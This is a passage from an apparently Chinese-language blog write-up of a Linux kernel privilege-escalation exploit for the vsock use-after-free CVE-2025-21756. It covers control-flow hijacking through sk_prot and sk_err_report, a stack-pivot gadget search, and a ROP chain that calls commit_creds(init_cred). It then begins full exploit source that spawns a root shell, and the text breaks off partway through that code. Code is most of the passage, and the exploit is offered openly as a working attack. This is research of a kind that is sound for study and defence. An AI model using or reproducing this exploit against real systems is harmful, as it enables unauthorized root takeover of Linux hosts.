<p><strong>在实际利用过程中，这种重复释放page并进行回收写，每次都成功命中的概率是很低的。</strong>但是由于测试的文件系统环境比较干净，使得该 POC 在这样的情况下利用成功率还不错，这一点是需要注意的。</p>
<p><strong>同时，这里猜的地址实际上是没有开随机化时的值，所以实际情况下要爆破出该地址更是难上加难。</strong></p>
<p><strong>Step.5 Hijack control flow and Construct ROP</strong></p>
<p>由于我们已经劫持了<code>vuln_vsk</code>所在的 page，所以<code>vuln_vsk</code> 结构体的内容由我们可控，与其他劫持控制流的思路一样，<code>vsk</code> 中也有一些函数指针的调用，这里劫持的思路是通过<code>vsock_release</code> 实现控制流劫持。</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-06-12_14-39-53.png" alt="Snipaste_2025-06-12_14-39-53"></p>
<p><code>sk-&gt;sk_prot-&gt;close</code> 是一个二级虚表函数指针调用，这意味着可以通过伪造<code>sk_prot</code>指向一个拥有函数指针的结构体实现任意函数调用，这里选取的对象是<code>raw_prot</code>，该对象存在一个函数指针调用为<code>raw_abort</code>，函数内容如下：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-06-12_15-06-41.png" alt="Snipaste_2025-06-12_15-06-41"></p>
<p>如下图所示，因此可以通过伪造<code>sk-&gt;sk_err_report</code> 字段来实现控制流劫持的目的。</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-06-12_15-07-45.png" alt="Snipaste_2025-06-12_15-07-45"></p>
<p>由于 <code>sk</code> 结构体内容可控，所以控制流劫持第一步当然是栈迁移，经过调试后发现在执行到<code>sk_err_report</code>时，寄存器<code>rbx</code> 和<code>rdi</code>都指向<code>vuln_vsk</code>的堆地址，所以只要找类似<code>push rbx ; pop rsp ; ret </code> 或者<code>push rdi ; pop rsp ; ret </code>类似的 gadget 就可以了，但是实际上内核中品相这么好用的 gadget 很少（几乎没有），通过<code>ropper</code>和<code>ROPgadget</code> 都没有找到。</p>
<p>这里提一下笔者找栈迁移 gadget 的思路，由于前面两种常见找gadget方式都没找到，所以采用了一种比较原始的方式，即扫描内核<code>kernel code</code>段匹配对应<code>push rbx ; pop rsp ;</code>的字节码 0x535C ，然后在找到的结果（总共68处）中在人工筛选满足条件的能够完成实际栈迁移的<code>gadget</code>。</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-06-12_15-26-18.png" alt="Snipaste_2025-06-12_15-26-18"></p>
<p>最终锁定如下图所示的一处 <code>gadget</code>，由于中间有个<code>jb</code>跳转，所以在实际测试过程中可能因为满足跳转条件而不走后面 <code>ret</code>，怀着忐忑的心情在测试后，发现可以成功执行到<code>ret</code> 完成栈迁移，至此就可以布置 ROP 链完成提权。</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-06-12_15-28-05.png" alt="Snipaste_2025-06-12_15-28-05"></p>
<p>详细 ROP 链如下；</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create the rop chain!</span></span><br><span class="line"><span class="type">long</span> deadbuf = <span class="number">0</span>;</span><br><span class="line">write(pipes[i][<span class="number">1</span>], &amp;deadbuf, <span class="number">8</span>);</span><br><span class="line">write(pipes[i][<span class="number">1</span>], &amp;deadbuf, <span class="number">8</span>);</span><br><span class="line">write(pipes[i][<span class="number">1</span>], &amp;deadbuf, <span class="number">8</span>);</span><br><span class="line">write(pipes[i][<span class="number">1</span>], &amp;deadbuf, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">write(pipes[i][<span class="number">1</span>], &amp;pop_r15_ret, <span class="number">8</span>); <span class="comment">// junk</span></span><br><span class="line">write(pipes[i][<span class="number">1</span>], &amp;raw_proto_abort, <span class="number">8</span>); <span class="comment">// sk_prot (calls sk-&gt;sk_error_report())</span></span><br><span class="line">write(pipes[i][<span class="number">1</span>], &amp;ret, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// totoally add 0x18 data so dont need `write(pipes[i][1], buf, 0x18);`</span></span><br><span class="line">write(pipes[i][<span class="number">1</span>], &amp;pop_rdi_ret, <span class="number">8</span>); <span class="comment">// stack pivot target</span></span><br><span class="line">write(pipes[i][<span class="number">1</span>], &amp;init_cred, <span class="number">8</span>);</span><br><span class="line">write(pipes[i][<span class="number">1</span>], &amp;ret, <span class="number">8</span>); </span><br><span class="line"><span class="comment">// write(pipes[i][1], &amp;ret, 8); </span></span><br><span class="line"></span><br><span class="line">write(pipes[i][<span class="number">1</span>], &amp;commit_creds, <span class="number">8</span>); <span class="comment">// commit_creds(init_cred);</span></span><br><span class="line">write(pipes[i][<span class="number">1</span>], &amp;swapgs_restore_regs_and_return_to_usermode, <span class="number">8</span>);</span><br><span class="line">write(pipes[i][<span class="number">1</span>], &amp;null_ptr, <span class="number">8</span>); <span class="comment">// rax</span></span><br><span class="line">write(pipes[i][<span class="number">1</span>], &amp;null_ptr, <span class="number">8</span>); <span class="comment">// rdi</span></span><br><span class="line">write(pipes[i][<span class="number">1</span>], &amp;shell, <span class="number">8</span>); <span class="comment">// rip</span></span><br><span class="line">write(pipes[i][<span class="number">1</span>], &amp;user_cs, <span class="number">8</span>);</span><br><span class="line">write(pipes[i][<span class="number">1</span>], &amp;user_rflags, <span class="number">8</span>);</span><br><span class="line">write(pipes[i][<span class="number">1</span>], &amp;user_rsp, <span class="number">8</span>); <span class="comment">// rsp</span></span><br><span class="line">write(pipes[i][<span class="number">1</span>], &amp;user_ss, <span class="number">8</span>);</span><br><span class="line"><span class="comment">// write(pipes[i][1], buf, 0x18);</span></span><br><span class="line">write(pipes[i][<span class="number">1</span>], &amp;not, <span class="number">8</span>); <span class="comment">// sk_lock</span></span><br><span class="line">write(pipes[i][<span class="number">1</span>], &amp;not, <span class="number">8</span>); <span class="comment">// sk_lock</span></span><br><span class="line">write(pipes[i][<span class="number">1</span>], &amp;null_ptr, <span class="number">8</span>); <span class="comment">// sk_lock</span></span><br><span class="line">write(pipes[i][<span class="number">1</span>], &amp;null_ptr, <span class="number">8</span>); <span class="comment">// sk_lock</span></span><br><span class="line">write(pipes[i][<span class="number">1</span>], buf, <span class="number">0x200</span>);</span><br><span class="line">write(pipes[i][<span class="number">1</span>], &amp;push_rbx_pop_rsp_ret, <span class="number">8</span>); <span class="comment">// stack pivot [sk_error_report()]</span></span><br></pre></td></tr></table></figure></div>



<h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><p>最终利用效果如下图所示</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-06-12_15-33-19.png" alt="Snipaste_2025-06-12_15-33-19"></p>
<p><strong>exp</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/vm_sockets.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/vm_sockets_diag.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sock_diag.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pause() {write(STDOUT_FILENO, <span class="string">"[*] Paused (press enter to continue)\n"</span>, 37); getchar();}</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    CVE-2025-21756 Exploit</span></span><br><span class="line"><span class="comment">    Michael Hoefler</span></span><br><span class="line"><span class="comment">    4/18/2025</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_PORT_RETRIES	24	<span class="comment">/* net/vmw_vsock/af_vsock.c */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VMADDR_CID_NONEXISTING	42</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// PINGv6 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJS_PER_SLAB 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CPU_PARTIAL 24</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLUSH ((OBJS_PER_SLAB) * (CPU_PARTIAL + 1))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRE (OBJS_PER_SLAB - 1) * 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POST (OBJS_PER_SLAB + 1) * 10</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE 1280</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SPRAY_SIZE 1200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUM_PIPES 500</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 8192</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 4096</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Create socket &lt;type&gt;, bind to &lt;cid, port&gt; and return the file descriptor. */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">vsock_bind</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> cid, <span class="type">unsigned</span> <span class="type">int</span> port, <span class="type">int</span> type)</span></span><br><span class="line">{</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_vm</span> <span class="title">sa</span> =</span> {</span><br><span class="line">		.svm_family = AF_VSOCK,</span><br><span class="line">		.svm_cid = cid,</span><br><span class="line">		.svm_port = port,</span><br><span class="line">	};</span><br><span class="line">	<span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line">	fd = socket(AF_VSOCK, type, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (fd &lt; <span class="number">0</span>) {</span><br><span class="line">		perror(<span class="string">"socket"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (bind(fd, (<span class="keyword">struct</span> sockaddr *)&amp;sa, <span class="keyword">sizeof</span>(sa))) {</span><br><span class="line">		perror(<span class="string">"bind"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> fd;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// this is a universal function to print binary data from a char* array</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">void</span> *addr, <span class="type">int</span> len)</span> </span><br><span class="line">{</span><br><span class="line">    <span class="type">size_t</span> *buf64 = (<span class="type">size_t</span> *) addr;</span><br><span class="line">    <span class="type">char</span> *buf8 = (<span class="type">char</span> *) addr;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">2</span>) {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"  %04x"</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">2</span>; j++) {</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">" 0x%016lx"</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">"                   "</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"   "</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">'.'</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析内核返回的套接字信息</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">parse_diag_response</span><span class="params">(<span class="type">char</span> *buf, <span class="type">int</span> len)</span> {</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (nlh = (<span class="keyword">struct</span> nlmsghdr *)buf; NLMSG_OK(nlh, len); nlh = NLMSG_NEXT(nlh, len)) {</span><br><span class="line">        <span class="keyword">if</span> (nlh-&gt;nlmsg_type == NLMSG_ERROR) {</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Netlink error\n"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nlh-&gt;nlmsg_type == NLMSG_DONE)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 提取套接字诊断信息</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">vsock_diag_msg</span> *<span class="title">diag</span> =</span> NLMSG_DATA(nlh);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"vsock_diag_msg content:\</span></span><br><span class="line"><span class="string">                \n state=%u, ino=%u,\n src_cid=0x%x, src_port=0x%x,\</span></span><br><span class="line"><span class="string">                \n dst_cid=0x%x, dst_port=0x%x\n"</span>,</span><br><span class="line">               diag-&gt;vdiag_state,</span><br><span class="line">               diag-&gt;vdiag_ino,</span><br><span class="line">               diag-&gt;vdiag_src_cid,</span><br><span class="line">               diag-&gt;vdiag_src_port,</span><br><span class="line">               diag-&gt;vdiag_dst_cid,</span><br><span class="line">               diag-&gt;vdiag_dst_port);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// get a shell</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">(<span class="type">void</span>)</span>{</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[*] Returned to userland"</span>);</span><br><span class="line">    <span class="keyword">if</span> (getuid() == <span class="number">0</span>){</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[*] UID: %d, got root!\n"</span>, getuid());</span><br><span class="line">        __asm__(</span><br><span class="line">            <span class="string">"pop rdi;"</span></span><br><span class="line">        );</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[!] UID: %d, didn't get root\n"</span>, getuid());</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">get_user_rsp</span><span class="params">()</span> {</span><br><span class="line">    <span class="type">long</span> rsp;</span><br><span class="line">    __asm__ <span class="title function_">volatile</span><span class="params">(<span class="string">"mov %%rsp, %0"</span> : <span class="string">"=r"</span>(rsp))</span>;</span><br><span class="line">    <span class="keyword">return</span> rsp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> query_flag = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">query_vsock_diag</span><span class="params">()</span> {</span><br><span class="line">    <span class="type">int</span> sock;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">sa</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vsock_diag_req</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="type">char</span> 